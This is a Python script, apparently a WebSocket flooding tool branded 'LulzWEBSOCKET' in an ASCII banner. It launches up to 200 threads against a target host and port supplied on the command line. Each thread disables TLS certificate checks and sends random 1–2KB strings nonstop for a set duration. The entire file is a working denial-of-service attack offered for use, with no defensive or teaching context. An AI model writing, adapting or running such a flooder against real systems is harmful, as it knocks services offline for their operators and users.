import threading, sys, os, time, socket, asyncio
from random import randint
from websocket import create_connection
from utils import *

async def flood():
    def on_error(a,b): return
    def on_close(a,b,c): return

    host = sys.argv[2]
    port = int(sys.argv[3])
    duration = sys.argv[4]

    stoptime = time.time() + int(duration)

    cumsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cumsock.settimeout(5)
    cumsock.connect( (host, int(port)) )
    if port == 443:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        mainws = create_connection(f'wss://{host}:{str(port)}', socket=cumsock, on_error=on_error, on_close=on_close, timeout=5, ssl=ctx)
    else:
        mainws = create_connection(f'ws://{host}:{str(port)}', socket=cumsock, on_error=on_error, on_close=on_close, timeout=5)

    while time.time() < stoptime:
        try:
            mainws.send(randstr(randint(1024, 2048)))
        except KeyboardInterrupt:
            os.kill(os.getpid(), 9)
        except Exception:
            pass
    
    cumsock.close()

def wrapper():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(flood())
    loop.run_forever()

if __name__ == '__main__':
    print('''
             /$$                 /$$           /$$      /$$ /$$$$$$$$ /$$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$  /$$   /$$ /$$$$$$$$ /$$$$$$$$
            | $$                | $$          | $$  /$ | $$| $$_____/| $$__  $$ /$$__  $$ /$$__  $$ /$$__  $$| $$  /$$/| $$_____/|__  $$__/
            | $$       /$$   /$$| $$ /$$$$$$$$| $$ /$$$| $$| $$      | $$  \ $$| $$  \__/| $$  \ $$| $$  \__/| $$ /$$/ | $$         | $$   
            | $$      | $$  | $$| $$|____ /$$/| $$/$$ $$ $$| $$$$$   | $$$$$$$ |  $$$$$$ | $$  | $$| $$      | $$$$$/  | $$$$$      | $$   
            | $$      | $$  | $$| $$   /$$$$/ | $$$$_  $$$$| $$__/   | $$__  $$ \____  $$| $$  | $$| $$      | $$  $$  | $$__/      | $$   
            | $$      | $$  | $$| $$  /$$__/  | $$$/ \  $$$| $$      | $$  \ $$ /$$  \ $$| $$  | $$| $$    $$| $$\  $$ | $$         | $$   
            | $$$$$$$$|  $$$$$$/| $$ /$$$$$$$$| $$/   \  $$| $$$$$$$$| $$$$$$$/|  $$$$$$/|  $$$$$$/|  $$$$$$/| $$ \  $$| $$$$$$$$   | $$   
            |________/ \______/ |__/|________/|__/     \__/|________/|_______/  \______/  \______/  \______/ |__/  \__/|________/   |__/
    ''')
    
    try:
        threadcount = 200 if int(sys.argv[1]) > 200 else int(sys.argv[1])

        for _ in range(threadcount):
            threading.Thread(target=wrapper).start()
    except:
        print('error')